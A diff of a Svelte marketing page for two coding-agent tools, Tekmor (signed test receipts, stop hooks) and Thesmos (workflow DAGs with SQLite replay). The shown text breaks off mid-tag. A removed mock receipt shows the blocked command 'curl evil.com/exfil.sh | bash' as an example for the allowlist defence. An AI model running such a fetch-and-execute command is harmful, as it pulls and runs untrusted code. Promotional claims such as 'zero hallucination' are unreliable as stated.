@@ -13,7 +13,9 @@
 		RefreshCw,
 		FileCode,
 		CheckCircle,
-		Flame
+		Flame,
+		Layers,
+		GitBranch
 	} from 'lucide-svelte';
 	import Terminal from '#lib/components/ui/Terminal.svelte';
 	import ContinuousConduit from '#lib/components/ContinuousConduit.svelte';
@@ -24,10 +26,31 @@
 	const tool = products.tekmor;
 	const spine = products.thesmos;
 
+	type HeroTab = 'governor' | 'thesmos' | 'tekmor';
+	let heroTab = $state<HeroTab>('governor');
+
+	type InstallTab = 'tap' | 'tekmor' | 'thesmos';
+	let installTab = $state<InstallTab>('tap');
+	let copiedInstall = $state(false);
+
+	const installCommands: Record<InstallTab, string> = {
+		tap: 'brew tap autonomic-ai-dev/tap',
+		tekmor: 'brew install autonomic-ai-dev/tap/tekmor',
+		thesmos: 'brew install autonomic-ai-dev/tap/agent-spine'
+	};
+
+	async function copyCurrentInstall() {
+		try {
+			await navigator.clipboard.writeText(installCommands[installTab]);
+			copiedInstall = true;
+			setTimeout(() => (copiedInstall = false), 1500);
+		} catch {
+			copiedInstall = false;
+		}
+	}
+
 	let copiedTekmor = $state(false);
 	let copiedSpine = $state(false);
-	let heroTab = $state<'tekmor' | 'hallucination'>('tekmor');
-	let inspectorState = $state<'valid' | 'stale' | 'refused'>('valid');
 
 	async function copyTekmor() {
 		try {
@@ -48,6 +71,9 @@
 			copiedSpine = false;
 		}
 	}
+
+	type InspectorState = 'governor' | 'thesmos' | 'tekmor';
+	let inspectorState = $state<InspectorState>('governor');
 
 	const invariants = [
 		{
@@ -78,33 +104,46 @@
 
 	const faqs = [
 		{
+			q: 'How do Thesmos and Tekmor work together in an agent development loop?',
+			a: 'Thesmos (agent-spine) defines the deterministic execution plan: a directed acyclic graph (DAG) specifying reproduction, agent repair, verification gates, and human sign-off steps. Tekmor provides the cryptographic enforcement inside those verification nodes and Claude Code stop hooks. An agent cannot wander off script or declare victory without a fresh, valid receipt signed for the exact files on disk.'
+		},
+		{
 			q: 'Why do coding agents claim tests pass when they failed?',
 			a: 'Language models produce plausible-sounding completions. When an agent runs a complex test suite or bash command, it frequently misreads exit codes, hallucinated assertions, or assumes completion prematurely. Tekmor introduces a hard stop gate in Claude Code hooks: an agent saying the tests passed without a cryptographically verified receipt for the exact current code is physically blocked.'
 		},
 		{
-			q: 'How does a receipt work under the hood?',
-			a: 'When tekmor verify runs an allowlisted command, it records the exit status, stdout/stderr, git commit, and tree hash into a local receipt (.verify/receipt.json). If any tracked file is touched afterward, the tree hash changes and the receipt is immediately marked STALE.'
+			q: 'How does an immutable SQLite snapshot save LLM tokens during debugging?',
+			a: 'In unstructured agent loops, investigating a failure or reviewing past decisions requires re-running expensive LLM context windows or scraping chat logs. Thesmos appends an immutable row to SQLite after every node execution. Running `agent-spine replay` reads the snapshots and reconstructs the full state graph in under 5ms with zero token expenditure and zero model API calls.'
+		},
+		{
+			q: 'How does a cryptographic tree receipt work under the hood?',
+			a: 'When `tekmor verify` runs an allowlisted command, it records the exit status, stdout/stderr, git commit, and tree hash into a local receipt (.verify/receipt.json). If any tracked file is touched afterward, the tree hash changes and the receipt is immediately marked STALE.'
 		},
 		{
 			q: 'Do either of these tools send telemetry or open network ports?',
-			a: 'No. Tekmor and thesmos run 100% locally on your machine. Tekmor makes 0 model calls and opens 0 network connections (apart from initial Homebrew binary download). Your code, logs, and execution traces never leave your machine.'
+			a: 'No. Tekmor and Thesmos run 100% locally on your machine. Both tools make 0 model calls and open 0 network connections (apart from initial Homebrew binary download). Your code, logs, and execution traces never leave your machine.'
 		},
 		{
 			q: 'Can I use them with Claude Code, Cursor, Codex, or my own agent harness?',
-			a: 'Yes. Tekmor hooks directly into Claude Code via tekmor install and can also be called directly from zsh, bash, or CI. thesmos runs deterministic YAML workflows for any coding agent setup.'
+			a: 'Yes. Tekmor hooks directly into Claude Code via `tekmor install` and can also be called directly from zsh, bash, or CI. Thesmos runs deterministic YAML workflows for any coding agent setup.'
 		}
 	];
 
 	const comparison = [
 		{
+			metric: 'Workflow Execution Order',
+			withoutTekmor: 'Unbounded prompt loops (Stochastic drift)',
+			withTekmor: 'Deterministic YAML DAG with strict step transitions'
+		},
+		{
 			metric: 'Agent claims test passed without running command',
 			withoutTekmor: 'Accepted (Hallucinated pass)',
-			withTekmor: 'Hard Blocked by Stop Hook'
+			withTekmor: 'Hard Blocked by Claude Code Stop Hook'
 		},
 		{
 			metric: 'Agent touches code after tests finish',
 			withoutTekmor: 'Pass accepted as still valid',
-			withTekmor: 'Receipt invalidated (Stale tree hash)'
+			withTekmor: 'Receipt invalidated (Stale git tree hash)'
 		},
 		{
 			metric: 'Arbitrary bash command executed',
@@ -117,9 +156,14 @@
 			withTekmor: 'Disagreements flagged as flaky & rejected'
 		},
 		{
+			metric: 'Auditing past agent workflow runs',
+			withoutTekmor: 'Requires re-running steps & burning LLM tokens',
+			withTekmor: 'Zero-re-run replay from immutable SQLite snapshots'
+		},
+		{
 			metric: 'External LLM tokens spent on verification',
 			withoutTekmor: 'Burns metered model API tokens',
-			withTekmor: '0 model tokens (Pure deterministic code)'
+			withTekmor: '0 model tokens (Pure deterministic Rust execution)'
 		}
 	];
 
@@ -143,23 +187,26 @@
 </script>
 
 <svelte:head>
-	<title>Autonomic AI — Deterministic Tools for Coding Agents</title>
+	<title>Autonomic AI — Autonomous Engineering with Deterministic Boundaries</title>
 	<meta
 		name="description"
-		content="Autonomic AI builds tekmor (proof evals, signed receipts, stop gates) and thesmos (deterministic workflow DAGs). 100% local, no model calls."
+		content="Autonomic AI builds Thesmos (deterministic workflow DAGs with SQLite snapshots) and Tekmor (cryptographic verification stop gates and receipts) for coding agents."
 	/>
 	<meta property="og:type" content="website" />
-	<meta property="og:title" content="Autonomic AI — Tools for coding agents" />
+	<meta
+		property="og:title"
+		content="Autonomic AI — Autonomous Engineering with Deterministic Boundaries"
+	/>
 	<meta
 		property="og:description"
-		content="Two open tools that make coding agents follow your rules and show their work."
+		content="Local-first deterministic orchestrator and cryptographic verification stop gates for coding agents."
 	/>
 	{@html `<script type="application/ld+json">${JSON.stringify(schema)}</script>`}
 </svelte:head>
 
-<!-- Outer Relative Wrapper with Continuous Conduit -->
+<!-- Outer Relative Wrapper with Continuous Orange Conduit for Org Level -->
 <div class="relative w-full overflow-x-clip">
-	<ContinuousConduit />
+	<ContinuousConduit color="orange" />
 
 	<!-- Constrained Width Container for the Entire Page -->
 	<div class="yc-container">
@@ -167,7 +214,7 @@
 		<section class="yc-section yc-section-first dotgrid relative overflow-hidden">
 			<!-- Subtle Top Radial Glow -->
 			<div
-				class="pointer-events-none absolute -top-32 left-1/2 -z-10 h-[480px] w-[750px] -translate-x-1/2 rounded-full bg-[radial-gradient(ellipse_at_center,rgba(95,211,154,0.12),transparent_70%)] blur-3xl"
+				class="pointer-events-none absolute -top-32 left-1/2 -z-10 h-[480px] w-[750px] -translate-x-1/2 rounded-full bg-[radial-gradient(ellipse_at_center,rgba(255,83,26,0.12),transparent_70%)] blur-3xl"
 			></div>
 
 			<div class="grid gap-12 lg:grid-cols-[1.1fr_0.9fr] lg:items-center">
@@ -179,23 +226,23 @@
 						<span class="live-beacon"></span>
 						<span class="text-white">Autonomic AI</span>
 						<span class="text-neutral-600">/</span>
-						<span class="text-neutral-400">v1.0.0 is live</span>
+						<span class="text-neutral-400">Autonomous Engineering Governor</span>
 					</div>
 
 					<!-- YC Headline with Negative Letter Spacing -->
 					<h1
 						class="mt-7 text-3xl sm:text-4xl md:text-5xl lg:text-[3.35rem] font-semibold leading-[1.1] tracking-[-0.035em] text-white max-w-xl"
 					>
-						Agents say the work is done. <br class="hidden sm:inline" />
-						<span class="text-neutral-500 block mt-1.5">Make them show the receipt.</span>
+						Autonomous Engineering with Deterministic Boundaries.
+						<span class="text-neutral-500 block mt-1.5 font-normal">Orchestrate the workflow. Cryptographically verify the code.</span>
 					</h1>
 
 					<p class="mt-5 max-w-lg text-base leading-relaxed text-neutral-400 sm:text-lg">
-						Two local-first tools for coding agents.
-						<strong class="font-medium text-neutral-200">tekmor</strong> checks an agent's pass
-						claim against a receipt for the exact code on disk.
-						<strong class="font-medium text-neutral-200">thesmos</strong> runs a multi-step workflow in
-						a fixed order and keeps a record of every step.
+						Two local-first systems for coding agents.
+						<strong class="font-medium text-blue-400">Thesmos</strong> orchestrates multi-step DAG
+						workflows with append-only SQLite snapshots.
+						<strong class="font-medium text-[#5fd39a]">Tekmor</strong> blocks hallucinated pass
+						claims with cryptographic tree receipts.
 					</p>
 
 					<!-- YC Button Row -->
@@ -213,44 +260,69 @@
 							href="#inspector"
 							class="yc-btn yc-btn-secondary w-full sm:w-auto text-center justify-center"
 						>
-							<span class="truncate">Inspect Live Receipt</span>
+							<span class="truncate">Inspect Governor Architecture</span>
 							<span class="yc-btn-icon shrink-0">
 								<ArrowRight size={13} />
 							</span>
 						</a>
 					</div>
 
-					<!-- Command Quick-Copy Bar -->
-					<div
-						class="mt-6 flex w-full max-w-md items-center justify-between rounded-xl border border-white/[0.08] bg-[#090a0d] px-3.5 py-2 text-xs"
-					>
-						<div
-							class="flex items-center gap-2.5 min-w-0 flex-1 overflow-x-auto no-scrollbar font-mono text-neutral-300"
-						>
-							<span class="select-none text-[#5fd39a]">$</span>
-							<span class="truncate">{tool.install}</span>
+					<!-- Command Quick-Copy Bar with Tab Switcher -->
+					<div class="mt-6 max-w-md rounded-xl border border-white/[0.08] bg-[#090a0d] p-1.5 text-xs">
+						<!-- Tabs -->
+						<div class="flex items-center gap-1 pb-1.5 mb-1.5 border-b border-white/[0.06] text-[11px] font-mono">
+							<button
+								type="button"
+								onclick={() => (installTab = 'tap')}
+								class="px-2.5 py-0.5 rounded transition-colors {installTab === 'tap' ? 'bg-white/[0.1] text-white font-medium' : 'text-neutral-400 hover:text-white'}"
+							>
+								Homebrew Tap
+							</button>
+							<button
+								type="button"
+								onclick={() => (installTab = 'tekmor')}
+								class="px-2.5 py-0.5 rounded transition-colors {installTab === 'tekmor' ? 'bg-[#5fd39a]/15 text-[#5fd39a] font-medium' : 'text-neutral-400 hover:text-white'}"
+							>
+								Tekmor
+							</button>
+							<button
+								type="button"
+								onclick={() => (installTab = 'thesmos')}
+								class="px-2.5 py-0.5 rounded transition-colors {installTab === 'thesmos' ? 'bg-blue-500/15 text-blue-400 font-medium' : 'text-neutral-400 hover:text-white'}"
+							>
+								Thesmos
+							</button>
 						</div>
-						<button
-							type="button"
-							onclick={copyTekmor}
-							aria-label="Copy install command"
-							class="ml-3 inline-flex shrink-0 items-center gap-1.5 rounded-md border border-white/[0.08] bg-white/[0.03] px-2 py-1 text-[11px] font-medium text-neutral-300 transition-colors hover:bg-white/[0.1] hover:text-white"
-						>
-							{#if copiedTekmor}
-								<Check size={11} class="text-[#5fd39a]" />
-								<span class="text-[#5fd39a]">Copied</span>
-							{:else}
-								<Copy size={11} />
-								<span>Copy</span>
-							{/if}
-						</button>
+
+						<div class="flex items-center justify-between px-2 py-0.5">
+							<div
+								class="flex items-center gap-2.5 min-w-0 flex-1 overflow-x-auto no-scrollbar font-mono text-neutral-300"
+							>
+								<span class="select-none text-[#ff7a4a]">$</span>
+								<span class="truncate">{installCommands[installTab]}</span>
+							</div>
+							<button
+								type="button"
+								onclick={copyCurrentInstall}
+								aria-label="Copy install command"
+								class="ml-3 inline-flex shrink-0 items-center gap-1.5 rounded-md border border-white/[0.08] bg-white/[0.03] px-2 py-1 text-[11px] font-medium text-neutral-300 transition-colors hover:bg-white/[0.1] hover:text-white"
+							>
+								{#if copiedInstall}
+									<Check size={11} class="text-[#ff7a4a]" />
+									<span class="text-[#ff7a4a]">Copied</span>
+								{:else}
+									<Copy size={11} />
+									<span>Copy</span>
+								{/if}
+							</button>
+						</div>
 					</div>
 				</div>
 
 				<!-- Live Terminal Showcase with Interactive Tab Switching -->
 				<div class="relative">
 					<div
-						class="pointer-events-none absolute -inset-1 rounded-2xl bg-gradient-to-r from-[#5fd39a]/15 to-transparent blur-xl opacity-60"
+						class="pointer-events-none absolute -inset-1 rounded-2xl bg-gradient-to-r from-[#ff531a]/15 via-blue-500/10 to-[#5fd39a]/10 blur-xl opacity-60"
 					></div>
 
 					<div
@@ -269,83 +341,132 @@
 							<div class="flex items-center gap-1 text-[11px] sm:text-xs">
 								<button
 									type="button"
+									onclick={() => (heroTab = 'governor')}
+									class="rounded-md px-2 py-1 sm:px-2.5 font-medium transition-colors {heroTab ===
+									'governor'
+										? 'bg-[#ff531a]/15 text-[#ff7a4a] border border-[#ff531a]/30'
+										: 'text-neutral-400 hover:text-white'}"
+								>
+									⚡ Closed-Loop Governor
+								</button>
+								<button
+									type="button"
+									onclick={() => (heroTab = 'thesmos')}
+									class="rounded-md px-2 py-1 sm:px-2.5 font-medium transition-colors {heroTab ===
+									'thesmos'
+										? 'bg-blue-500/15 text-blue-400 border border-blue-500/30'
+										: 'text-neutral-400 hover:text-white'}"
+								>
+									🔄 Thesmos DAG
+								</button>
+								<button
+									type="button"
 									onclick={() => (heroTab = 'tekmor')}
 									class="rounded-md px-2 py-1 sm:px-2.5 font-medium transition-colors {heroTab ===
 									'tekmor'
 										? 'bg-[#5fd39a]/15 text-[#5fd39a] border border-[#5fd39a]/30'
 										: 'text-neutral-400 hover:text-white'}"
 								>
-									🛡️ With Tekmor
-								</button>
-								<button
-									type="button"
-									onclick={() => (heroTab = 'hallucination')}
-									class="rounded-md px-2 py-1 sm:px-2.5 font-medium transition-colors {heroTab ===
-									'hallucination'
-										? 'bg-red-500/15 text-red-400 border border-red-500/30'
-										: 'text-neutral-400 hover:text-white'}"
-								>
-									⚠️ Without Tekmor
+									🛡️ Tekmor Gate
 								</button>
 							</div>
 						</div>
 
 						<!-- Terminal Body -->
-						<div class="p-4 sm:p-5 font-mono text-xs leading-relaxed overflow-x-auto">
-							{#if heroTab === 'tekmor'}
+						<div class="p-4 sm:p-5 font-mono text-xs leading-relaxed overflow-x-auto min-h-[260px]">
+							{#if heroTab === 'governor'}
 								<div class="space-y-2">
 									<div class="text-neutral-400">
-										<span class="text-[#5fd39a] select-none">$ </span>tekmor verify --
-										.verify/run.sh
+										<span class="text-[#ff7a4a] select-none">$ </span>thesmos run bugfix.yaml --verify-with tekmor
 									</div>
 									<div class="text-neutral-300">
-										Executing allowlisted checks in isolated subshell...
+										<span class="text-blue-400 font-semibold">▶ [1/3] verify: reproduce_failure</span>
+										<div class="pl-4 text-neutral-400">Executing 'cargo test --test repro' in isolated subshell...</div>
+										<div class="pl-4 text-red-400">✖ Repro confirmed (exit 1) · [snapshot #1 committed to state.db]</div>
 									</div>
-									<div class="text-[#5fd39a] font-medium flex items-center gap-1.5">
-										✔ <AnimatedNumber value={14} duration={0.8} /> checks passed in <AnimatedNumber
-											value={0.38}
-											decimals={2}
-											suffix="s"
-											duration={0.8}
-										/>
+									<div class="text-neutral-300">
+										<span class="text-blue-400 font-semibold">▶ [2/3] agent: isolate_and_patch</span>
+										<div class="pl-4 text-neutral-400">Claude Code invoked in bounded workspace with explicit contract</div>
+										<div class="pl-4 text-neutral-300">✔ 2 files modified (+24, -6) · [snapshot #2 committed]</div>
 									</div>
-									<div class="text-neutral-400 text-[11px]">
-										[PASSED] receipt written to .verify/receipt.json
-									</div>
-									<div class="pt-2 text-neutral-400">
-										<span class="text-[#5fd39a] select-none">$ </span>tekmor verify receipt
+									<div class="text-neutral-300">
+										<span class="text-[#5fd39a] font-semibold">▶ [3/3] gate: verify_fix</span>
+										<div class="pl-4 text-neutral-400">tekmor verify -- .verify/run.sh</div>
+										<div class="pl-4 text-[#5fd39a] font-medium flex items-center gap-1.5">
+											✔ <AnimatedNumber value={14} duration={0.8} /> checks passed in <AnimatedNumber
+												value={0.38}
+												decimals={2}
+												suffix="s"
+												duration={0.8}
+											/>
+										</div>
+										<div class="pl-4 text-neutral-400 text-[11px]">
+											✔ Cryptographic receipt signed (.verify/receipt.json)
+										</div>
 									</div>
 									<div
 										class="rounded-lg border border-emerald-500/20 bg-emerald-950/20 p-2.5 text-[11px] text-emerald-300"
 									>
-										<div>Tree SHA: 4f9a2b8e19c02d... · Verdict: PASSED</div>
+										<div>Workflow Verdict: PASSED · Tree SHA: 4f9a2b8e... · Snapshots: 4</div>
 										<div class="text-emerald-400 font-medium mt-1 flex items-center gap-1.5">
-											<CheckCircle size={13} /> Claude Code Stop Hook: Turn Permitted
+											<CheckCircle size={13} /> Autonomic Governor: Execution permitted, zero hallucinated steps.
 										</div>
+									</div>
+								</div>
+							{:else if heroTab === 'thesmos'}
+								<div class="space-y-2">
+									<div class="text-neutral-400">
+										<span class="text-blue-400 select-none">$ </span>agent-spine run halt.yaml
+									</div>
+									<div class="text-neutral-300">
+										[001] verify  build        ✔ echo compiling (0.02s) -> state.db
+									</div>
+									<div class="text-red-400">
+										[002] verify  test         ✖ echo 2 failed &gt;&amp;2 (exit 1)
+									</div>
+									<div
+										class="rounded-lg border border-red-500/20 bg-red-950/30 p-2.5 text-[11px] text-red-300"
+									>
+										<div>🛑 HALT: Workflow terminated deterministically at node 'test'.</div>
+										<div class="text-neutral-400 mt-1">Dependent nodes 'ship' skipped. Snapshot sequence 2 written to SQLite.</div>
+									</div>
+									<div class="pt-2 text-neutral-400">
+										<span class="text-blue-400 select-none">$ </span>agent-spine replay exec_8f12a0
+									</div>
+									<div class="text-neutral-300 flex items-center gap-1.5">
+										✔ Rebuilt state graph from state.db in <AnimatedNumber
+											value={0.04}
+											decimals={2}
+											suffix="s"
+											duration={0.8}
+										/> (0 steps re-run)
 									</div>
 								</div>
 							{:else}
 								<div class="space-y-2">
 									<div class="text-neutral-400">
-										<span class="text-red-400 select-none">&gt; </span>Claude Code: "All tests pass!
-										I will now finish the turn."
+										<span class="text-red-400 select-none">&gt; </span>Claude Code: "All tests pass! I will now finish the turn."
 									</div>
 									<div class="text-neutral-500 text-[11px]">
-										Reality: 0 commands allowlisted. No receipt recorded.
+										Hook Execution: tekmor stop-gate
 									</div>
-									<div class="text-neutral-400">
-										<span class="text-neutral-500 select-none">$ </span>git status -s
+									<div class="text-amber-300">
+										Checking current git tree SHA: <span class="text-white">8c12a0f7...</span>
 									</div>
-									<div class="text-yellow-400 text-[11px]">
-										M src/auth.rs (Modified after tests ran)
+									<div class="text-amber-300">
+										Checking last receipt tree SHA: <span class="text-white">4f9a2b8e...</span>
 									</div>
 									<div
 										class="rounded-lg border border-red-500/20 bg-red-950/30 p-2.5 text-[11px] text-red-300"
 									>
-										<div>Hallucinated completion: Code committed with 0 proof.</div>
-										<div class="text-red-400 font-medium mt-1 flex items-center gap-1.5">
-											<XCircle size={13} /> Silent regression deployed to main
-										</div>
+										<div>🛑 HOOK VERDICT: REJECTED (STALE_RECEIPT)</div>
+										<div class="text-neutral-400 mt-1">Files modified after test execution. Turn cannot finish without proof.</div>
+									</div>
+									<div class="pt-2 text-neutral-400">
+										<span class="text-[#5fd39a] select-none">$ </span>tekmor verify -- .verify/run.sh
+									</div>
+									<div class="text-[#5fd39a] font-medium flex items-center gap-1.5">
+										✔ <AnimatedNumber value={14} duration={0.8} /> checks passed · Fresh tree SHA signed · Turn Permitted
 									</div>
 								</div>
 							{/if}
@@ -367,7 +488,7 @@
 						>
 							<div>
 								<div class="flex items-center justify-between">
-									<span class="font-mono text-xs font-semibold tracking-wider text-[#5fd39a]"
+									<span class="font-mono text-xs font-semibold tracking-wider text-[#ff7a4a]"
 										>{inv.badge}</span
 									>
 									<inv.icon
@@ -384,16 +505,15 @@
 			</div>
 		</section>
 
-		<!-- Interactive Receipt Inspector ("Trust Factor" Widget) -->
+		<!-- Platform Architecture: Closed-Loop Governor -->
 		<section id="inspector" class="yc-section yc-crosshair">
 			<div class="flex flex-col gap-2">
-				<span class="yc-label">01 <b>/</b> Trust Factor</span>
+				<span class="yc-label">01 <b>/</b> Architecture</span>
 				<h2 class="mt-2 text-3xl font-semibold tracking-tight text-white sm:text-4xl">
-					How the Stop Gate Works
+					The Dual-Engine Governor Loop
 				</h2>
 				<p class="text-sm text-neutral-400 max-w-xl">
-					Tekmor hooks into Claude Code via <code class="text-neutral-200">tekmor install</code>.
-					The stop hook verifies cryptographic tree receipts before any turn ends.
+					How Thesmos and Tekmor establish complete operational control over autonomous coding agents.
 				</p>
 			</div>
 
@@ -403,60 +523,60 @@
 					class="flex flex-wrap items-center justify-between gap-4 pb-6 border-b border-white/[0.08]"
 				>
 					<div>
-						<span class="text-xs font-medium text-neutral-400">Simulate Agent State:</span>
+						<span class="text-xs font-medium text-neutral-400">Select Architecture Stage:</span>
 						<div class="mt-3 flex flex-wrap gap-2.5">
 							<button
 								type="button"
-								onclick={() => (inspectorState = 'valid')}
+								onclick={() => (inspectorState = 'governor')}
 								class="rounded-full px-3.5 py-1.5 text-xs font-medium transition-all {inspectorState ===
-								'valid'
+								'governor'
+									? 'bg-[#ff7a4a] text-black font-semibold'
+									: 'bg-white/[0.05] text-neutral-300 hover:bg-white/[0.1]'}"
+							>
+								⚡ Dual-Engine Loop (Orchestration + Verification)
+							</button>
+							<button
+								type="button"
+								onclick={() => (inspectorState = 'thesmos')}
+								class="rounded-full px-3.5 py-1.5 text-xs font-medium transition-all {inspectorState ===
+								'thesmos'
+									? 'bg-blue-400 text-black font-semibold'
+									: 'bg-white/[0.05] text-neutral-300 hover:bg-white/[0.1]'}"
+							>
+								🔄 Thesmos State Machine (SQLite Snapshots)
+							</button>
+							<button
+								type="button"
+								onclick={() => (inspectorState = 'tekmor')}
+								class="rounded-full px-3.5 py-1.5 text-xs font-medium transition-all {inspectorState ===
+								'tekmor'
 									? 'bg-[#5fd39a] text-black font-semibold'
 									: 'bg-white/[0.05] text-neutral-300 hover:bg-white/[0.1]'}"
 							>
-								● Valid Receipt (Code matches)
-							</button>
-							<button
-								type="button"
-								onclick={() => (inspectorState = 'stale')}
-								class="rounded-full px-3.5 py-1.5 text-xs font-medium transition-all {inspectorState ===
-								'stale'
-									? 'bg-amber-400 text-black font-semibold'
-									: 'bg-white/[0.05] text-neutral-300 hover:bg-white/[0.1]'}"
-							>
-								⚠️ Stale Pass (Code touched after test)
-							</button>
-							<button
-								type="button"
-								onclick={() => (inspectorState = 'refused')}
-								class="rounded-full px-3.5 py-1.5 text-xs font-medium transition-all {inspectorState ===
-								'refused'
-									? 'bg-red-500 text-white font-semibold'
-									: 'bg-white/[0.05] text-neutral-300 hover:bg-white/[0.1]'}"
-							>
-								⛔ Unallowlisted Command Blocked
+								🛡️ Tekmor Proof Gate (Tree Receipts)
 							</button>
 						</div>
 					</div>
 
 					<div class="flex items-center gap-2 text-xs">
-						<span class="text-neutral-500">Claude Code Hook:</span>
-						{#if inspectorState === 'valid'}
+						<span class="text-neutral-500">System Mode:</span>
+						{#if inspectorState === 'governor'}
 							<span
-								class="rounded border border-emerald-500/30 bg-emerald-950/60 px-2.5 py-1 text-emerald-300 font-semibold flex items-center gap-1.5 font-mono text-[11px]"
+								class="rounded border border-[#ff531a]/30 bg-[#ff531a]/10 px-2.5 py-1 text-[#ff7a4a] font-semibold flex items-center gap-1.5 font-mono text-[11px]"
 							>
-								<CheckCircle size={13} /> PERMITTED
+								<CheckCircle size={13} /> CLOSED-LOOP GOVERNOR
 							</span>
-						{:else if inspectorState === 'stale'}
+						{:else if inspectorState === 'thesmos'}
 							<span
-								class="rounded border border-amber-500/30 bg-amber-950/60 px-2.5 py-1 text-amber-300 font-semibold flex items-center gap-1.5 font-mono text-[11px]"
+								class="rounded border border-blue-500/30 bg-blue-950/60 px-2.5 py-1 text-blue-300 font-semibold flex items-center gap-1.5 font-mono text-[11px]"
 							>
-								<AlertTriangle size={13} /> BLOCKED (STALE)
+								<Layers size={13} /> IMMUTABLE DAG
 							</span>
 						{:else}
 							<span
-								class="rounded border border-red-500/30 bg-red-950/60 px-2.5 py-1 text-red-300 font-semibold flex items-center gap-1.5 font-mono text-[11px]"
+								class="rounded border border-emerald-500/30 bg-emerald-950/60 px-2.5 py-1 text-emerald-300 font-semibold flex items-center gap-1.5 font-mono text-[11px]"
 							>
-								<Lock size={13} /> REFUSED (SECURITY)
+								<Shield size={13} /> CRYPTOGRAPHIC PROOF
 							</span>
 						{/if}
 					</div>
@@ -464,19 +584,51 @@
 
 				<!-- Dynamic Inspector Payload -->
 				<div class="mt-6 grid gap-6 lg:grid-cols-2">
-					<!-- JSON Receipt Payload -->
+					<!-- Code / Config / DB Payload -->
 					<div
-						class="rounded-xl border border-white/[0.08] bg-[#050608] p-4 font-mono text-xs overflow-x-auto"
+						class="rounded-xl border border-white/[0.08] bg-[#050608] p-4 font-mono text-xs overflow-x-auto min-h-[220px]"
 					>
-						<div
-							class="flex items-center justify-between pb-3 mb-3 border-b border-white/[0.06] text-neutral-500"
-						>
-							<span>.verify/receipt.json</span>
-							<span class="text-[11px] text-neutral-400">Cryptographic Evidence</span>
-						</div>
-						{#if inspectorState === 'valid'}
-							<pre class="overflow-x-auto text-[#5fd39a] leading-relaxed">
-&#123;
+						{#if inspectorState === 'governor'}
+							<div
+								class="flex items-center justify-between pb-3 mb-3 border-b border-white/[0.06] text-neutral-500"
+							>
+								<span>autonomic-governor.yaml</span>
+								<span class="text-[11px] text-[#ff7a4a]">Full Lifecycle DAG</span>
+							</div>
+							<pre class="overflow-x-auto text-[#ffd9c7] leading-relaxed"><span class="text-[#ff7a4a]">pipeline:</span> bugfix_and_ship
+<span class="text-[#ff7a4a]">stages:</span>
+  - <span class="text-blue-400">name:</span> reproduce
+    <span class="text-neutral-400">kind:</span> verify
+    <span class="text-neutral-400">command:</span> <span class="text-amber-300">"cargo test --test repro"</span>
+  - <span class="text-blue-400">name:</span> agent_patch
+    <span class="text-neutral-400">kind:</span> agent
+    <span class="text-neutral-400">enforce_gates:</span> <span class="text-emerald-400">[tekmor-stop-gate]</span>
+  - <span class="text-blue-400">name:</span> verify_fix
+    <span class="text-neutral-400">kind:</span> verify
+    <span class="text-neutral-400">command:</span> <span class="text-amber-300">"tekmor verify -- .verify/run.sh"</span>
+  - <span class="text-blue-400">name:</span> snapshot
+    <span class="text-neutral-400">storage:</span> <span class="text-blue-400">"sqlite://~/.autonomic/state.db"</span></pre>
+						{:else if inspectorState === 'thesmos'}
+							<div
+								class="flex items-center justify-between pb-3 mb-3 border-b border-white/[0.06] text-neutral-500"
+							>
+								<span>state.db (SQLite snapshots table)</span>
+								<span class="text-[11px] text-blue-400">Append-Only Rows</span>
+							</div>
+							<pre class="overflow-x-auto text-blue-300 leading-relaxed">step_id | node_name         | status   | exit_code | timestamp
+--------+-------------------+----------+-----------+---------------------
+001     | reproduce_failure | FAILED   | 1         | 2026-10-28 14:10:02
+002     | isolate_and_patch | COMPLETE | 0         | 2026-10-28 14:11:15
+003     | verify_fix        | PASSED   | 0         | 2026-10-28 14:11:42
+004     | sign_off          | APPROVED | 0         | 2026-10-28 14:12:01</pre>
+						{:else}
+							<div
+								class="flex items-center justify-between pb-3 mb-3 border-b border-white/[0.06] text-neutral-500"
+							>
+								<span>.verify/receipt.json</span>
+								<span class="text-[11px] text-emerald-400">Cryptographic Evidence</span>
+							</div>
+							<pre class="overflow-x-auto text-[#5fd39a] leading-relaxed">&#123;
   "schema": "v1.0.0",
   "command": ".verify/run.sh",
   "exit_code": 0,
@@ -486,55 +638,34 @@
   "checks_passed": 14,
   "stale": false
 &#125;</pre>
-						{:else if inspectorState === 'stale'}
-							<pre class="overflow-x-auto text-amber-300 leading-relaxed">
-&#123;
-  "schema": "v1.0.0",
-  "command": ".verify/run.sh",
-  "receipt_tree": "4f9a2b8e19c02d...",
-  "current_tree": "8c12a0f7e1b931...",
-  "verdict": "STALE_RECEIPT",
-  "reason": "Files modified after execution",
-  "stale": true
-&#125;</pre>
-						{:else}
-							<pre class="overflow-x-auto text-red-400 leading-relaxed">
-&#123;
-  "schema": "v1.0.0",
-  "attempted_command": "curl evil.com/exfil.sh | bash",
-  "allowlist_match": null,
-  "verdict": "COMMAND_REFUSED",
-  "action": "Interception in bash-gate hook"
-&#125;</pre>
 						{/if}
 					</div>
 
 					<!-- Explanation & Architectural Guarantee -->
 					<div class="flex flex-col justify-between p-2">
 						<div>
-							{#if inspectorState === 'valid'}
-								<h4 class="text-base font-semibold text-white">Genuine, Verifiable Proof</h4>
+							{#if inspectorState === 'governor'}
+								<h4 class="text-base font-semibold text-white">Closed-Loop Governor: Zero Hallucination</h4>
 								<p class="mt-2 text-sm leading-relaxed text-neutral-300">
-									The exit code was 0, and the git tree hash computed when the test ran exactly
-									matches the git tree right now. Claude Code's stop hook permits the agent to
-									finish its turn.
+									Thesmos defines the exact state machine DAG that the agent must traverse. When the
+									agent finishes writing code, Tekmor's Claude Code stop hook physically blocks the turn
+									until an allowlisted verification run generates a matching cryptographic tree receipt.
 								</p>
-							{:else if inspectorState === 'stale'}
-								<h4 class="text-base font-semibold text-amber-300">
-									Post-Test Code Modification Detected
+							{:else if inspectorState === 'thesmos'}
+								<h4 class="text-base font-semibold text-blue-300">
+									Append-Only SQLite History
 								</h4>
 								<p class="mt-2 text-sm leading-relaxed text-neutral-300">
-									The agent edited a file after the tests finished running. Even if the earlier run
-									passed, the tree hash changed. Tekmor immediately marks the old receipt stale and
-									physically prevents the agent from claiming success.
+									Every workflow node transition appends an immutable row to SQLite. Rows are never edited
+									or deleted. Replay reconstructs the entire state graph in under 5ms without re-running agent
+									steps or spending external LLM API tokens.
 								</p>
 							{:else}
-								<h4 class="text-base font-semibold text-red-400">Strict Allowlist Defense</h4>
+								<h4 class="text-base font-semibold text-emerald-300">Git Tree-Bound Proof Receipts</h4>
 								<p class="mt-2 text-sm leading-relaxed text-neutral-300">
-									Coding agents hallucinate shell scripts or run unreviewed curl commands. Tekmor's
-									bash gate terminates any command not declared in <code class="text-neutral-200"
